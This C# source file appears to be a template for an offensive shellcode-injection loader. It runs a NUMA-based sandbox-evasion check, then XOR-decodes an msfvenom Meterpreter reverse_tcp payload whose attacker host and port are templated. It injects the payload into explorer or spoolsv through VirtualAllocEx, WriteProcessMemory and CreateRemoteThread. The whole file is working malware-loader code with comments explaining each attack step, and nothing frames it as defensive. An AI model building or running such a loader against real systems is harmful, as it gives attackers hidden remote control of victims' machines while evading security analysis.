using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RemoteShinject
{
    public class Program
    {
        // Process access flags for OpenProcess API
        // Defines what operations we can perform on the target process
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF  // Request all available access rights
        }

        // Memory allocation types for VirtualAllocEx
        // Specifies how memory should be allocated in remote process
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,   // Commit physical storage in memory
            Reserve = 0x2000   // Reserve region of virtual address space
        }

        // Memory protection constants
        // Controls execution and access permissions for allocated memory
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40  // Allow code execution, reading, and writing
        }

        // Windows API: Open an existing process object
        // Returns handle to process which allows manipulation
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        // Windows API: Allocate memory in remote process
        // Used to create space for our shellcode in target process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        // Windows API: Write data to remote process memory
        // Transfers our shellcode into the allocated memory region
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // Windows API: Create a thread in remote process
        // Executes our injected shellcode by starting new thread
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Windows API: Allocate memory with NUMA support (sandbox evasion)
        // Returns null in sandboxed environments, allowing detection
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        // Windows API: Get handle to current process
        // Used in combination with VirtualAllocExNuma for sandbox detection
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // Helper property to check if process is running with administrative privileges
        // Determines which process to inject into by default
        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static void Main(string[] args)
        {
            // Sandbox evasion technique using VirtualAllocExNuma
            // Sandboxes often don't implement NUMA functions properly
            // If this returns null, we're likely in a sandbox - bail out
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // XOR-encoded shellcode generated by msfvenom
            // Encoding key: 0x{{ xor_key }}
            // Original payload: windows/x64/meterpreter/reverse_tcp
            // LHOST={{ lhost }}, LPORT={{ lport }}
            {{ csharp_payload | indent(12) }}

            int len = buf.Length;

            // Parse command-line arguments for target process
            // If no argument provided, auto-select based on privilege level
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0) {
                // Auto-injection based on elevation level
                // Elevated: inject into spoolsv (Print Spooler - often overlooked)
                // Non-elevated: inject into explorer (Windows Explorer - always running)
                if (IsElevated)
                {
                    Console.WriteLine("Process is elevated.");
                    procName = "{{ elevated_target }}";
                } 
                else
                {
                    Console.WriteLine("Process is not elevated.");
                    procName = "{{ default_target }}";
                }
            }
            else
            {
                Console.WriteLine("Usage: .\\{{ output_file }} [process_name]");
                Console.WriteLine("Leave empty for auto-injection based on privilege level.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // Get all process instances matching the target name
            // Multiple instances may exist (e.g., multiple explorer.exe)
            Process[] expProc = Process.GetProcessesByName(procName);

            // Iterate through all matching processes and attempt injection
            // Stop after first successful injection
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // Step 1: Obtain handle to target process with full access rights
                // This allows us to allocate memory and create threads
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Step 2: Allocate executable memory in the remote process
                // Memory must be readable, writable, and executable for shellcode
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Step 3: Decode the XOR-encrypted shellcode
                // Apply XOR decryption with key 0x{{ xor_key }} to reveal actual payload
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});
                }

                // Step 4: Write decoded shellcode to allocated memory in target process
                // This transfers our malicious code into the remote process space
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                // Step 5: Execute shellcode by creating remote thread
                // Thread starts at the beginning of our injected shellcode
                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}
